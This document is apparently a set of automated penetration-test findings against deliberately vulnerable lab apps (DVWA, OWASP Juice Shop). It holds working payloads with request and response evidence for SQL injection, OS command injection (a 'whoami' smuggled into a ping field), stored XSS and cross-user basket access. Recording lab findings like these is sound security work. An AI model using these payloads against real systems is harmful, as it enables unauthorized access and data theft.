findings.title: SQL Injection in /vulnerabilities/sqli/ via id parameter (Low security)
findings.response_evidence: TRUE condition (id=1' OR '1'='1) returned 5 user records: 'First name: admin Surname: admin', 'First name: Gordon Surname: Brown', 'First name: Hack Surname: Me', 'First name: Pablo Surname: Picasso', 'First name: Bob Surname: Smith'. FALSE condition (id=1' AND '1'='2) returned zero records (result area shows only 'User ID:' with no ID/First name/Surname entries). SQLi DB: mysql.

findings.title: OS Command Injection in /vulnerabilities/exec/ via ip parameter (Low security)
request_sequence: POST /vulnerabilities/exec/ form ip=127.0.0.1; whoami&Submit=Submit (session dvwa_admin, application/x-www-form-urlencoded)
findings.response_evidence: Ping output of 127.0.0.1 completed (4 packets, 0% loss), followed by the injected command output line 'www-data' immediately before 'More Information'. Pre-block: '...rtt min/avg/max/mdev = 0.019/0.024/0.032/0.004 ms\nwww-data'.

findings.title: Stored XSS in /vulnerabilities/xss_s/ guestbook message (Low security)
request_sequence: POST /vulnerabilities/xss_s/ form txtName=tester, mtxMessage=<script id="test_token">window.xss_flag=1</script>, btnSign=Sign Guestbook (session dvwa_admin)
findings.response_evidence: POST accepted (HTTP 200) and the guestbook entry was persisted; the rendering page lists 'Name: tester Message:' entry. Canary is 50 chars and was submitted verbatim into mtxMessage (maxlength 50); txtName=tester (6 chars, within maxlength 10). Stored-XSS execution check in a fresh page load by dvwa_admin returned window.xss_flag = 1.

findings.title: Cross-user basket access (BOLA) via GET /rest/basket/{id}
findings.response_evidence: Account 1 own basket (acct1, own_basket_id=6): {"status":"success","data":{"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)","quantity":3,"BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3}}]}}. Account 2 (acct2, own_basket_id=7) requesting basket 6 received HTTP 200 with the identical body: {"status":"success","data":{"id":6,"UserId":22,"Products":[{"id":1,"name":"Apple Juice (1000ml)", "BasketItem":{"BasketId":6,"quantity":3}}]}}. acct2 retrieved acct1's distinct seeded basket item (Apple Juice (1000ml), quantity 3) without ownership check. Note: the mapper's /rest/basket/1 record (UserId 1 basket) was not separately tested; this verification used acct1's own basket ID 6 as instructed.

findings.title: SQL injection in product search parameter q
request_sequence: GET http://juiceshop:3000/rest/products/search?q=' OR 1=1-- (unauth) -> 500 SQLITE_ERROR: incomplete input (unbalanced parentheses in base query)
GET http://juiceshop:3000/rest/products/search?q=')) OR 1=1-- (unauth, TRUE) -> 200 status success, multiple records
findings.response_evidence: TRUE condition q=')) OR 1=1--: HTTP 200, {"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)",...},{"id":2,"name":"Orange Juice (1000ml)",...},{"id":3,"name":"Eggfruit Juice (500ml)",...},{"id":4,"name":"Raspberry Juice (1000ml)",...},{"id":5,"name":"Lemon Juice (500ml)",...},{"id":6,"name":"Banana Juice (1000ml)",...},{"id":7,"name":"OWASP Juice Shop T-Shirt",...},{"id":8,"name":"OWASP Juice Shop CTF Girlie-Shirt",...},{"id":9,"name":"OWASP SSL Advanced Forensic Tool (O-Saft)",...},{"id":10,"name":"Christmas Super-Surprise-Box (2014 Edition)",...}, ...] (full unfiltered catalog, including records with deletedAt set, i.e. rows normally hidden). FALSE condition q=')) AND 1=2--: HTTP 200, {"status":"success","data":[]} (zero records). Injected boolean condition alone controls result set cardinality (full catalog vs zero). Bare-quote payloads ' OR 1=1-- and ' AND 1=2-- produce SQLite syntax errors (500), consistent with injection into the SQL string. Verified with unauthenticated session.

findings.title: Cross-user basket access (BOLA) via GET /rest/basket/1 by juiceshop_acct2
request_sequence: GET http://juiceshop:3000/rest/basket/6 (session juiceshop_acct1) -> 200, own_basket_id=6, UserId 22, Products: Apple Juice (1000ml) qty 3
findings.response_evidence: Acct2 (own basket 7) retrieved basket id 1 with \"UserId\":1 (not acct2's UserId, and not acct1's basket 6 which has UserId 22). Basket 1 contains foreign seeded items: Apple Juice (1000ml) quantity 2 (BasketItem id 1), Orange Juice (1000ml) quantity 3 (BasketItem id 2), Eggfruit Juice (500ml) quantity 1 (BasketItem id 3). Response: {\"status\":\"success\",\"data\":{\"id\":1,\"coupon\":null,\"UserId\":1,...}}. Acct1 basket 6 baseline: Apple Juice (1000ml) qty 3. No ownership check on basket id.
